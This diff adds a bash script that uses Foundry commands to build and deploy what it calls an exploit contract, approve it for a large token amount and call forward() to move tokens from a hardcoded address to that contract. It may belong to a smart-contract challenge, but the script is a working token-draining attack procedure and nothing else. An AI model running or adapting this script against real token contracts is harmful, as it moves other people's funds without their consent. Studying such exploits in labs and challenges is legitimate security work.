@@ -1,0 +1,17 @@
+#!/bin/bash
+shopt -s expand_aliases
+alias ccs='cast send --private-key $PRIVATE_KEY'
+
+echo building and testing
+forge build
+forge test
+
+echo deploying exploit contract
+EXPLOIT_ADDRESS=$(forge create --private-key $PRIVATE_KEY --json src/Forwarder.sol:Forwarder | jq .'deployedTo' --raw-output | cat)
+echo "exploit deployed to $EXPLOIT_ADDRESS"
+
+echo approving exploit address for all tokens
+ccs $CONTRACT_ADDRESS 'approve(address,uint256)' $EXPLOIT_ADDRESS 1000000000000000000000000
+
+echo forwarding all tokens to exploit address
+ccs $EXPLOIT_ADDRESS 'forward(address,address,address,uint256)' $CONTRACT_ADDRESS 0x496E09fCb240c33B8fDa3b4B74d81697C03B6B3d $EXPLOIT_ADDRESS 1000000000000000000000000
